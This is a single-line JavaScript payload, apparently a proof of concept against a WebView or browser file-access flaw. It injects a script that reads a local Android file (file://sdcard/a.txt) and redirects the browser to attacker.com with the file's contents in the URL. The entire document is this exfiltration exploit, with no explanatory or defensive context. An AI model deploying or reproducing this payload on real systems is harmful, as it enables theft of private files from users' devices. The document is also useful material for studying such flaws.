document.write("<script> var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { window.location.replace('https://attacker.com/?exfiltrated='+xhr.responseText); } } \nxhr.open('GET', 'file://sdcard/a.txt', true); xhr.send(null);</script> ");
